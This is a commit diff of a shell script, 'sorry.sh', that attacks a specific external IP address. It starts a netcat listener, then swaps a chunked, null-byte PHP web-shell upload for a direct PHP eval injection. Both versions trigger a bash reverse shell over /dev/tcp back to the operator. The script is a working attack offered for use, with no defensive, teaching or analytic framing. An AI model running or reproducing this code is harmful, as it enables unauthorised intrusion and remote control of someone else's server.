45b11350d281aa48c69814f837bca21a4458db9f
troiarcazzoguardi-dev <troiarcazzoguardi@gmail.com>
2026-01-12 14:11:27 -0500

    Update sorry.sh

--- sorry.sh
+++ sorry.sh
@@ -1,12 +1,6 @@
 IP=$(curl -s ifconfig.me)
 nc -lvnp 4444 &
 
-# 🔥 UPLOAD BYPASS (chunked + null byte)
-curl -k -X POST \
--H "Transfer-Encoding: chunked" \
--H "Content-Type: multipart/form-data" \
---data-binary $'<?php /*%00*/ system($_REQUEST[0]); ?>0\r\n\r\n' \
-"https://14.225.209.143:443//upload.php"
-
-sleep 2
-curl "https://14.225.209.143:443/shell.php?0=bash%20-i%20%3E%26%20/dev/tcp/$IP/4444%200%3E%261"
+curl -k -d "<?php @eval(\$_POST['p']);?>" \
+"https://14.225.209.143:443/index.php" \
+--data-urlencode "p=system('bash -i >& /dev/tcp/$IP/4444 0>&1');"
